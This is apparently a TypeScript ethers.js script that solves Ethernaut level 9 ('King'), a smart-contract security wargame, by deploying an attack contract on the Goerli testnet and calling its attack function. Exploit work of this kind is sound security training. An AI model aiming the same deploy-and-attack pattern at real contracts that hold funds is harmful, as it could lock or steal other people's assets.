import KingJSON from "../../artifacts/contracts/level9/King.sol/King.json"
import AttackJSON from "../../artifacts/contracts/level9/Attack.sol/Attack.json"
const ethers = require('ethers');
require ('dotenv').config ()

const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);
const privateKey: string = process.env.ACTOR_PRIVATE_KEY as string;
const kingContractAddress: string = process.env.LEVEL_ADDRESS as string;


let prize: any;
let newPrize: any;

// Define all function calls used
async function main(){
  console.log(`Ethernaut level 9 - script made by JoVi\n ------ \n`);
  const wallet = await new ethers.Wallet( privateKey, provider);
  const signer = wallet.connect(provider);
  const kingContract = new ethers.Contract(kingContractAddress, KingJSON.abi, signer);
  const attackContractInterface = new ethers.ContractFactory(AttackJSON.abi, AttackJSON.bytecode, signer);

  console.log(`Fetching prize value\n ------ \n`)
  const prize = await kingContract.prize();
  console.log(`Prize value: ${prize}\n ------ \n`)

  newPrize = '12000000000000000'
  const deploymentValue = '14000000000000000'
  
  // deploy new attack contract
  console.log(`Deploying attack contract with: ${deploymentValue} wei.\n ------ \n`)
  const attackContract = await attackContractInterface.deploy( kingContractAddress,
    {value: deploymentValue}
  );
  
  console.log(`Attack contract succesfully deployed at address ${attackContract.address}\n ------ \n`);

  console.log(`Attempting attack ${attackContract.address}\n ------ \n`);
  const attackContractTx = await attackContract.attack({gasLimit: 500000});
  const attackContractTxReceipt = await attackContractTx.wait();

  console.log(`Attempted attack succesfully.\n ------ \n`);
  console.log({attackContractTxReceipt})
  
}


// Execute
main();